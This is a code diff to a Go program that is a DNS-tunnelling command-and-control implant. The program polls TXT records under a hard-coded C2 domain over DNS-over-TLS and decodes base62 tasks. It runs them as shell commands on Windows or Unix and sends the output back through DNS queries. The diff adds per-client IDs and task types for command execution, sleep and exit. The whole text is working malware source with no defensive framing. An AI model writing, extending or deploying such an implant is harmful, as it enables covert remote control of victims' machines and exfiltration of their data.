@@ -1,9 +1,12 @@
 package main
 
 import (
+	"fmt"
 	"github.com/jxskiss/base62"
 	"github.com/miekg/dns"
 	"math"
+	"math/rand"
+	"os"
 	"os/exec"
 	"runtime"
 	"strconv"
@@ -16,13 +19,14 @@ var wg = sync.WaitGroup{}
 
 const c2addr = ".r.rce.moe."//必须以点开头结尾
 
-const addrstr = "123.125.81.6:853"
+const addrstr = "123.125.81.6:853" // 123.125.81.6:853 (360 DNS) DoT
 
 //const addrstr = "8.8.8.8:53"
 const payloadlen = 70.00
 const retry = 10
 const t = 10 //多线程
 var sleep = 10
+var clientid = ""
 
 func send(data []byte, packnumer string, mapnumer string, ch chan bool) {
 	defer wg.Done()
@@ -98,19 +102,15 @@ func senddata(data []byte, packnumer string) {
 }
 
 func main() {
-
+	rand.Seed(time.Now().UnixNano())
+	clientid = strconv.FormatInt(int64(100000+rand.Intn(900000)), 16)
 	m := new(dns.Msg)
 	m.SetQuestion(strconv.FormatInt(int64(time.Now().Unix()), 16)+c2addr, dns.TypeTXT)
 
 	for {
-
 		m := new(dns.Msg)
-		m.SetQuestion(strconv.FormatInt(int64(time.Now().Unix()), 16)+c2addr, dns.TypeTXT)
+		m.SetQuestion(strconv.FormatInt(int64(time.Now().Unix()), 16)+"-"+clientid+c2addr, dns.TypeTXT)
 		cl := &dns.Client{Net: "tcp-tls"}
-		o := new(dns.OPT)
-		o.Hdr.Name = "."
-		o.Hdr.Rrtype = dns.TypeOPT
-		m.Extra = append(m.Extra, o)
 		in, _, err := cl.Exchange(m, addrstr)
 		if err != nil {
 			println(err)
@@ -122,30 +122,45 @@ func main() {
 					if answer.Header().Rrtype == dns.TypeTXT {
 						for _, txt := range answer.(*dns.TXT).Txt {
 							cmdarr := strings.Split(txt, "|")
-							if len(cmdarr) != 2 {
+							//taskid|tasktype|taskdata
+							if len(cmdarr) != 3 {
 								continue
 							}
-							execmd, err := base62.Decode([]byte(cmdarr[1]))
+							taskdata, err := base62.Decode([]byte(cmdarr[2]))
 							if err != nil {
-								senddata([]byte("Decode error"), cmdarr[0])
+								senddata([]byte("Decode taskdata error"), cmdarr[0])
+								continue
+							}
+							switch cmdarr[1] {
+							case "1":
+								fmt.Printf("exec cmd")
+								if runtime.GOOS == "windows" {
+									cmd := exec.Command("cmd.exe", "/c", string(taskdata))
+									output, err := cmd.Output()
+									if err != nil {
+										senddata([]byte(err.Error()), cmdarr[0])
+									}
+									senddata(output, cmdarr[0])
+								} else {
+									cmd := exec.Command("/bin/sh", "-c", string(taskdata))
+									output, err := cmd.Output()
+									if err != nil {
+										senddata([]byte(err.Error()), cmdarr[0])
+									}
+									senddata(output, cmdarr[0])
+								}
+							case "2": //sleep
+								s, err := strconv.Atoi(string(taskdata))
+								if err == nil {
+									sleep = s
+								}
+
+							case "3": //exit
+								os.Exit(0)
+							default:
 								continue
 							}
 
-							if runtime.GOOS == "windows" {
-								cmd := exec.Command("cmd.exe", "/c", string(execmd))
-								output, err := cmd.Output()
-								if err != nil {
-									senddata([]byte(err.Error()), cmdarr[0])
-								}
-								senddata(output, cmdarr[0])
-							} else {
-								cmd := exec.Command("/bin/bash", "-c", string(execmd))
-								output, err := cmd.Output()
-								if err != nil {
-									senddata([]byte(err.Error()), cmdarr[0])
-								}
-								senddata(output, cmdarr[0])
-							}
 							println(txt)
 						}
 					}
